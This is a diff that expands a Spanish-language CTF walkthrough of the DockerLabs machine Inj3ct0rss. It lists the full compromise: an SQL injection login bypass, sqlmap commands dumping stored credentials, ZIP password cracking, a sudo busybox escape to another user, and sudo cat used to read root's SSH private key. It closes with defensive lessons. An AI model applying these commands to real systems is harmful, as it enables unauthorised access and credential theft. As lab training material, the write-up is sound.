@@ -1,79 +1,375 @@
-# INJ3CT0RSS — DockerLabs
+# Inj3ct0rss — DockerLabs
 
 **Plataforma:** DockerLabs  
-**Dificultad:** 🟠 Media  
+**Dificultad:** 🟡 Medio  
 **SO:** Linux  
+**Autor de la máquina:** d1se0  
+**Fecha de creación:** 18/08/2024  
+**Técnicas:** SQL Injection · SQLMap · ZIP Cracking · JohnTheRipper · SSH · sudo busybox abuse · sudo cat abuse · Private Key Disclosure
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **INJ3CT0RSS** de DockerLabs.
-
----
-
-## 1. Reconocimiento
-
-Vamos a desplegar la maquina vulnerable.
-
-Ahora haremos un escaneo profundo para ver los puertos abiertos del servidor.
-
-Vemos que tenemos el servicio de http, así que vamos a mirar que contiene.
-
-Explorando un poco encontramos un panel de login.
-
-## 2. Enumeración
-
-Aplicando sql injection podemos ver que ingresamos como administrador.
-
-No encontramos nada interesante así que vamos a utilizar sqlmap para ver si
-encontramos algo dentro de la base de datos.
-
-Vemos que tenemos bases de datos, así seguiremos explorando que
-encontramos.
-
-Al ver un supuesto directorio, lo exploramos y vemos un fichero .zip
-
-## 3. Explotación
-
-Lo intentamos extraer y vemos que cuenta con una contraseña.
-
-Utilizaremos zip2john para generar un hash y luego así poder utilizar john y así
-encontrar la contraseña.
-
-Encontramos las credenciales de un usuario.
-
-Ahora nos conectamos como este usuario y vemos
-
-## 4. Post-explotación
-
-Ahora vemos que tenemos el permiso del binario busybox en un directorio.
-
-Con ayuda de gtfobin veremos cómo podemos escalar privilegios al otro usuario y
-ejecutaremos los comandos.
-
-Ahora vemos que encontramos en su directorio sus credenciales.
-
-Nos conectamos por remoto al usuario por ssh.
-
-## 5. Escalada de privilegios
-
-Vemos a que tenemos permisos y vemos que al binario cat.
-
-Lo que haremos será ver la clave privada del usuario root.
-
-Nos lo creamos dentro de nuestro host y vamos a dar permisos con chmod.
-
-Nos conectamos por ssh con la clave que hemos hecho en nuestro host y vemos
-que somos root.
-
-## 6. Lección aprendida
-
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
-
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web y SQL Injection](#2-enumeración-web-y-sql-injection)
+3. [Explotación SQLMap](#3-explotación-sqlmap)
+4. [Cracking del ZIP protegido](#4-cracking-del-zip-protegido)
+5. [Acceso SSH — usuario ralf](#5-acceso-ssh--usuario-ralf)
+6. [Escalada horizontal — usuario capa](#6-escalada-horizontal--usuario-capa)
+7. [Escalada final a root](#7-escalada-final-a-root)
+8. [Lección aprendida](#8-lección-aprendida)
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 1. Despliegue y reconocimiento
+
+Desplegamos la máquina vulnerable:
+
+```bash
+sudo bash auto_deploy.sh inj3ct0rss.tar
+```
+
+> IP asignada: `172.17.0.2`
+
+Realizamos un escaneo profundo:
+
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+```
+
+Resultado:
+
+```text
+22/tcp open ssh
+80/tcp open http
+```
+
+Servicios detectados:
+
+```text
+OpenSSH
+Inj3ct0rs CTF - pUxC3/xA1g1na Principal
+```
+
+---
+
+## 2. Enumeración web y SQL Injection
+
+Accedemos al servidor web y exploramos la aplicación.
+
+Encontramos un panel de login vulnerable a SQL Injection.
+
+Payload utilizado:
+
+```sql
+' OR 1=1-- -
+```
+
+Resultado:
+
+```text
+Acceso como administrador
+```
+
+Una vez autenticados no encontramos información relevante inicialmente.
+
+---
+
+## 3. Explotación SQLMap
+
+Utilizamos SQLMap para automatizar la explotación SQLi:
+
+```bash
+sqlmap -u http://172.17.0.2/login.php --forms --dbs --batch
+```
+
+Resultado:
+
+```text
+information_schema
+injectors_db
+mysql
+performance_schema
+sys
+```
+
+Enumeramos tablas:
+
+```bash
+sqlmap -u http://172.17.0.2/login.php \
+--forms -D injectors_db --tables --batch
+```
+
+Resultado:
+
+```text
+users
+```
+
+Enumeramos columnas:
+
+```bash
+sqlmap -u http://172.17.0.2/login.php \
+--forms -D injectors_db -T users --columns --batch
+```
+
+Resultado:
+
+```text
+id
+password
+username
+```
+
+Extraemos datos:
+
+```bash
+sqlmap -u http://172.17.0.2/login.php \
+--forms -D injectors_db -T users \
+-C id,password,username --dump --batch
+```
+
+Resultado:
+
+```text
+root : loveyou
+jane : chicago123
+admin : password
+ralf : no_mirar_en_este_directorio
+```
+
+---
+
+## 4. Cracking del ZIP protegido
+
+Exploramos el directorio encontrado:
+
+```text
+http://172.17.0.2/no_mirar_en_este_directorio
+```
+
+Encontramos:
+
+```text
+secret.zip
+```
+
+Descargamos el archivo:
+
+```bash
+wget http://172.17.0.2/no_mirar_en_este_directorio/secret.zip
+```
+
+Intentamos extraerlo:
+
+```bash
+unzip secret.zip
+```
+
+Resultado:
+
+```text
+incorrect password
+```
+
+Generamos el hash:
+
+```bash
+zip2john secret.zip > password.hash
+```
+
+Crackeamos con JohnTheRipper:
+
+```bash
+john password.hash
+```
+
+Resultado:
+
+```text
+letmein
+```
+
+Extraemos el contenido:
+
+```bash
+unzip secret.zip
+```
+
+Contraseña:
+
+```text
+letmein
+```
+
+Archivo obtenido:
+
+```text
+confidencial.txt
+```
+
+Contenido:
+
+```text
+ralf:supersecurepassword
+```
+
+---
+
+## 5. Acceso SSH — usuario ralf
+
+Accedemos mediante SSH:
+
+```bash
+ssh ralf@172.17.0.2
+```
+
+Contraseña:
+
+```text
+supersecurepassword
+```
+
+Comprobamos privilegios sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(capa : capa) NOPASSWD: /usr/local/bin/busybox /nothing/*
+```
+
+Consultamos GTFOBins para `busybox`.
+
+Payload utilizado:
+
+```bash
+sudo -u capa /usr/local/bin/busybox /nothing/../../bin/sh
+```
+
+Verificamos usuario:
+
+```bash
+whoami
+capa
+```
+
+---
+
+## 6. Escalada horizontal — usuario capa
+
+Exploramos el directorio personal:
+
+```bash
+cd /home/capa
+ls
+```
+
+Resultado:
+
+```text
+passwd.txt
+```
+
+Leemos el archivo:
+
+```bash
+cat passwd.txt
+```
+
+Resultado:
+
+```text
+capa:capaelmejor
+```
+
+Accedemos mediante SSH:
+
+```bash
+ssh capa@172.17.0.2
+```
+
+Contraseña:
+
+```text
+capaelmejor
+```
+
+Comprobamos privilegios sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(ALL : ALL) NOPASSWD: /bin/cat
+```
+
+---
+
+## 7. Escalada final a root
+
+Aprovechamos `cat` para leer la clave privada de root:
+
+```bash
+sudo /bin/cat /root/.ssh/id_rsa
+```
+
+Copiamos el contenido en nuestro host:
+
+```bash
+nano id_rsa
+```
+
+Asignamos permisos correctos:
+
+```bash
+chmod 600 id_rsa
+```
+
+Accedemos como root mediante SSH:
+
+```bash
+ssh -i id_rsa root@172.17.0.2
+```
+
+Verificamos privilegios:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
+
+---
+
+## 8. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| SQL Injection | Extracción de información sensible |
+| Contraseñas débiles | Acceso inicial |
+| ZIP protegido con contraseña débil | Filtración de credenciales |
+| busybox ejecutable con sudo | Escalada horizontal |
+| sudo sobre cat | Lectura de archivos críticos |
+| Exposición de clave privada root | Compromiso total del sistema |
+
+**Para defenderse:**
+
+- Validar correctamente entradas SQL.
+- Aplicar políticas robustas de contraseñas.
+- No almacenar secretos en directorios accesibles.
+- Restringir binarios peligrosos mediante sudo.
+- Proteger claves privadas SSH adecuadamente.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
